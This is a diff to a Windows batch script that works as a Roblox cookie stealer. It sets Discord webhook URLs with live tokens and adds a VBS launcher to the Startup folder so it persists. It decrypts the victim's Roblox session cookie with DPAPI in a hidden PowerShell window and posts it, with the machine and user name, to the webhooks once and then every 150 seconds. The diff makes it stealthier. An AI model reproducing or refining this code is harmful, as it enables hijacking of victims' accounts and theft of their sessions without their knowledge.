@@ -1,4 +1,6 @@
 @echo off
+setlocal EnableDelayedExpansion
+
 set "LOGS=https://discord.com/api/webhooks/1563118302715322368/9xgemSM8Sf-T3QMCNppQ10zpxz0CMjaGohxFCg6Hl8R0cVYB-ELK49meQbAfAtvS65Mt"
 set "REGRAB=https://discord.com/api/webhooks/1563321942797455460/9VXQBvrcfwAk15eHsIy3B4i7B2AmU3N90UdnIAUP_ZM9sgrakO1jfjgPcbu1SJwzH9S_"
 set "ONLINE=https://discord.com/api/webhooks/1563322005359689802/j8YrC7L0NiTS0Xr0EenAjLTUdEpn-GY0CMauHvjr877IA6JXsbd9kYpbUTGPkYMDJVda"
@@ -15,12 +17,19 @@ copy /Y "%TEMP%\vanta_launch.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Progra
 :: ------------------
 
 echo Sending initial logs...
-
 set "cookie=No Roblox cookie found."
+
 if exist "%RC%" (
-    for /f "usebackq delims=" %%a in (`powershell -NoProfile -Command "$c = Get-Content '%RC%' -Raw; if ($c -match 'CookiesData\"\":\"\"([^\"]+)') { $b64 = $matches[1]; $bytes = [System.Convert]::FromBase64String($b64); try { $dec = [System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, 'CurrentUser'); [System.Text.Encoding]::UTF8.GetString($dec) } catch { 'Failed to decrypt.' } } else { $c }"`) do set "cookie=%%a"
+    :: Silently decrypt the cookie using PowerShell's native DPAPI, save to temp file
+    powershell -NoProfile -WindowStyle Hidden -Command "$c = Get-Content '%RC%' -Raw; if ($c -match 'CookiesData\"\":\"\"([^\"]+)') { $b64 = $matches[1]; $d = [System.Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String($b64), $null, 'CurrentUser'); [System.Text.Encoding]::UTF8.GetString($d) | Out-File '%TEMP%\ck.txt' -Encoding utf8 }"
+    
+    if exist "%TEMP%\ck.txt" (
+        for /f "usebackq delims=" %%a in ("%TEMP%\ck.txt") do set "cookie=%%a"
+        del "%TEMP%\ck.txt"
+    )
 )
 
+:: Send to Discord
 curl.exe -s -X POST -H "Content-Type: application/json" -d "{\"embeds\":[{\"title\":\"Initial Log\",\"description\":\"Client: %PC% / %USER%\",\"color\":65280}]}" %LOGS%
 curl.exe -s -X POST -H "Content-Type: application/json" -d "{\"embeds\":[{\"title\":\"Roblox Cookie\",\"description\":\"```\n%cookie%\n```\",\"color\":65280}]}" %LOGS%
 curl.exe -s -X POST -H "Content-Type: application/json" -d "{\"embeds\":[{\"title\":\"User Online\",\"description\":\"Client: %PC% / %USER%\",\"color\":65280}]}" %ONLINE%
@@ -29,7 +38,11 @@ echo Script is now looping.
 :loop
 timeout /t 150 /nobreak >nul
 if exist "%RC%" (
-    for /f "usebackq delims=" %%a in (`powershell -NoProfile -Command "$c = Get-Content '%RC%' -Raw; if ($c -match 'CookiesData\"\":\"\"([^\"]+)') { $b64 = $matches[1]; $bytes = [System.Convert]::FromBase64String($b64); try { $dec = [System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, 'CurrentUser'); [System.Text.Encoding]::UTF8.GetString($dec) } catch { 'Failed to decrypt.' } } else { $c }"`) do set "cookie=%%a"
-    curl.exe -s -X POST -H "Content-Type: application/json" -d "{\"embeds\":[{\"title\":\"Regrab Cookie\",\"description\":\"Client: %PC% / %USER%\n```\n%cookie%\n```\",\"color\":65280}]}" %REGRAB%
+    powershell -NoProfile -WindowStyle Hidden -Command "$c = Get-Content '%RC%' -Raw; if ($c -match 'CookiesData\"\":\"\"([^\"]+)') { $b64 = $matches[1]; $d = [System.Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String($b64), $null, 'CurrentUser'); [System.Text.Encoding]::UTF8.GetString($d) | Out-File '%TEMP%\ck.txt' -Encoding utf8 }"
+    if exist "%TEMP%\ck.txt" (
+        for /f "usebackq delims=" %%a in ("%TEMP%\ck.txt") do set "cookie=%%a"
+        del "%TEMP%\ck.txt"
+        curl.exe -s -X POST -H "Content-Type: application/json" -d "{\"embeds\":[{\"title\":\"Regrab Cookie\",\"description\":\"Client: %PC% / %USER%\n```\n%cookie%\n```\",\"color\":65280}]}" %REGRAB%
+    )
 )
 goto loop
